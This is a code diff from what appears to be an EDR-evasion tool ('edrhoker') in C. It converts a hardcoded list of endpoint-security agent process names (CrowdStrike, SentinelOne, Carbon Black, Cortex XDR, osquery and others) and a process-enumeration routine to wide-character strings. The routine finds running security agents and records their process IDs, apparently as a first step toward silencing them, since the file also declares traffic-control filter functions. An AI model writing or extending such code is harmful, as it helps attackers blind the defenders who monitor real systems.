@@ -40,20 +40,20 @@ typedef ULONG (WINAPI *TcDeleteFilterProc)(
 );
 
 /* Common EDR process names */
-static const char* EDR_PROCESS_NAMES[] = {
-    "csagent.exe",          /* CrowdStrike Falcon */
-    "cgagent.exe",          /* CrowdStrike Falcon */
-    "SentinelAgent.exe",    /* SentinelOne */
-    "SentinelAgentWorker.exe", /* SentinelOne */
-    "cb.exe",               /* Carbon Black */
-    "repair_tool.exe",      /* Carbon Black */
-    "MBAMService.exe",      /* Malwarebytes EDR */
-    "mupdate.exe",          /* Malwarebytes EDR */
-    "CortexXDRAgentForWindows.exe", /* Palo Alto Cortex XDR */
-    "logd.exe",             /* Palo Alto Cortex XDR */
-    "cmd_service.exe",      /* Custom EDRs */
-    "osquery.exe",          /* osquery agent */
-    "wmirepositorybackup.exe", /* WMI-based EDR */
+static const WCHAR* EDR_PROCESS_NAMES[] = {
+    L"csagent.exe",          /* CrowdStrike Falcon */
+    L"cgagent.exe",          /* CrowdStrike Falcon */
+    L"SentinelAgent.exe",    /* SentinelOne */
+    L"SentinelAgentWorker.exe", /* SentinelOne */
+    L"cb.exe",               /* Carbon Black */
+    L"repair_tool.exe",      /* Carbon Black */
+    L"MBAMService.exe",      /* Malwarebytes EDR */
+    L"mupdate.exe",          /* Malwarebytes EDR */
+    L"CortexXDRAgentForWindows.exe", /* Palo Alto Cortex XDR */
+    L"logd.exe",             /* Palo Alto Cortex XDR */
+    L"cmd_service.exe",      /* Custom EDRs */
+    L"osquery.exe",          /* osquery agent */
+    L"wmirepositorybackup.exe", /* WMI-based EDR */
     NULL
 };
 
@@ -85,11 +85,11 @@ int jocky_edrhoker_detect_edr_processes(
     do {
         /* Check if this process matches known EDR names */
         for (int i = 0; EDR_PROCESS_NAMES[i]; i++) {
-            if (strcmp(pe32.szExeFile, EDR_PROCESS_NAMES[i]) == 0) {
+            if (wcscmp(pe32.szExeFile, EDR_PROCESS_NAMES[i]) == 0) {
                 if (*out_found < max_count) {
                     out_processes[*out_found].pid = pe32.th32ProcessID;
-                    strcpy_s(out_processes[*out_found].process_name,
-                            sizeof(out_processes[*out_found].process_name),
+                    wcscpy_s(out_processes[*out_found].process_name,
+                            sizeof(out_processes[*out_found].process_name) / sizeof(WCHAR),
                             pe32.szExeFile);
                     out_processes[*out_found].port = 0;  /* Multiple ports possible */
                     (*out_found)++;
